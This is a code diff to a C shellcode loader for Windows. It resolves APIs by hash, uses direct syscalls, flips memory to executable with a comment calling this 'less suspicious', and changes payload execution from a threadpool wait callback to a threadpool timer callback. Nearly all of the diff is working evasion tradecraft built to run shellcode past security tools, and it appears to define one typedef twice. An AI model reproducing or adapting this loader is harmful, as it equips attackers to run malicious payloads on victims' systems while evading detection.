@@ -24,9 +24,8 @@
 #define RegQueryInfoKeyA_HASH 0x198E5584
 #define GetMonitorInfoW_HASH 0x3DA186A3
 #define EnumDisplayMonitors_HASH 0xBAEFE601
-#define CreateEventA_HASH 0x35792576
-#define CreateThreadpoolWait_HASH 0x8D5AB592
-#define SetThreadpoolWait_HASH 0x4CB4ECDE
+#define SetThreadpoolTimer_HASH 0xCECC5063
+#define CreateThreadpoolTimer_HASH 0x12A59EF1
 
 
 // Function definitions of loaded functions throughout the program
@@ -80,23 +79,29 @@ typedef LPVOID(WINAPI* fnVirtualAlloc) (
 	DWORD flProtect
 	);
 
-typedef HANDLE (WINAPI* fnCreateEventA) (
-	LPSECURITY_ATTRIBUTES lpEventAttributes,
-	BOOL                  bManualReset,
-	BOOL                  bInitialState,
-	LPCSTR                lpName
+
+typedef void(WINAPI* fnSetThreadpoolTimer) (
+	PTP_TIMER pti,
+	PFILETIME pftDueTime,
+	DWORD     msPeriod,
+	DWORD     msWindowLength
 );
 
-typedef PTP_WAIT (WINAPI* fnCreateThreadpoolWait) (
-	PTP_WAIT_CALLBACK    pfnwa,
+typedef void(WINAPI* fnInitializeThreadpoolEnvironment) (
+	PTP_CALLBACK_ENVIRON pcbe
+);
+
+typedef PTP_TIMER(WINAPI* fnCreateThreadpoolTimer) (
+	PTP_TIMER_CALLBACK   pfnti,
 	PVOID                pv,
 	PTP_CALLBACK_ENVIRON pcbe
 );
 
-typedef void (WINAPI* fnSetThreadpoolWait) (
-	PTP_WAIT  pwa,
-	HANDLE    h,
-	PFILETIME pftTimeout
+typedef void (WINAPI* fnSetThreadpoolTimer) (
+	PTP_TIMER pti,
+	PFILETIME pftDueTime,
+	DWORD     msPeriod,
+	DWORD     msWindowLength
 );
 
 #define INITIAL_SEED 7
@@ -367,29 +372,23 @@ int main() {
 	// Change protection of virtual memory, less suspicious
 	Sw3NtProtectVirtualMemory((HANDLE)-1, &executable_memory, &alloc_size, PAGE_EXECUTE_READ, &old_protect);
 
-	fnCreateEventA pCreateEventA = get_proc_address_hash(kernelbase_module, CreateEventA_HASH);
-	fnCreateThreadpoolWait pCreateThreadpoolWait = get_proc_address_hash(kernelbase_module, CreateThreadpoolWait_HASH);
-	fnSetThreadpoolWait pSetThreadpoolWait = get_proc_address_hash(kernel32_module, SetThreadpoolWait_HASH);
-	
-	char buffer[64];
-	wsprintfA(buffer, "Pointer: %p", pSetThreadpoolWait);  // wsprintfA supports %p
-	MessageBoxA(NULL, buffer, "Debug", MB_OK);
+	TP_CALLBACK_ENVIRON		tpCallbackEnv = { 0 };
+	FILETIME			FileDueTime = { 0 };
+	ULARGE_INTEGER			ulDueTime = { 0 };
+	PTP_TIMER			ptpTimer = NULL;
 
+	fnCreateThreadpoolTimer pCreateThreadpoolTimer = get_proc_address_hash(kernelbase_module, CreateThreadpoolTimer_HASH);
+	fnSetThreadpoolTimer pSetThreadpoolTimer = get_proc_address_hash(kernelbase_module, SetThreadpoolTimer_HASH);
 
-	HANDLE event = pCreateEventA(NULL, FALSE, TRUE, NULL);
-	MessageBoxA(NULL, "1", "", NULL);
-	PTP_WAIT threadPoolWait = pCreateThreadpoolWait((PTP_WAIT_CALLBACK)executable_memory, NULL, NULL);
-	MessageBoxA(NULL, "2", "", NULL);
-	pSetThreadpoolWait(threadPoolWait, event, NULL);
-	MessageBoxA(NULL, "3", "", NULL);
-	Sw3NtWaitForSingleObject(event, FALSE, INFINITE);
-	MessageBoxA(NULL, "4", "", NULL);
-	
+	// Inline function
+	InitializeThreadpoolEnvironment(&tpCallbackEnv);
 
-	////HANDLE event = CreateEventA(NULL, FALSE, TRUE, NULL);
-	////PTP_WAIT threadPoolWait = CreateThreadpoolWait((PTP_WAIT_CALLBACK)executable_memory, NULL, NULL);
-	////SetThreadpoolWait(threadPoolWait, event, NULL);
-	////Sw3NtWaitForSingleObject(event, FALSE, INFINITE);
+	ptpTimer = pCreateThreadpoolTimer((PTP_TIMER_CALLBACK)executable_memory, NULL, &tpCallbackEnv);
+	ulDueTime.QuadPart = (ULONGLONG) 0;
+	FileDueTime.dwHighDateTime = ulDueTime.HighPart;
+	FileDueTime.dwLowDateTime = ulDueTime.LowPart;
+	pSetThreadpoolTimer(ptpTimer, &FileDueTime, 0x00, 0x00);
+	Sw3NtWaitForSingleObject((HANDLE)-1, FALSE, INFINITE);
 
 	// Replacement for getchar(), since getchar() is in the CRT
 	HANDLE h = GetStdHandle(STD_INPUT_HANDLE);
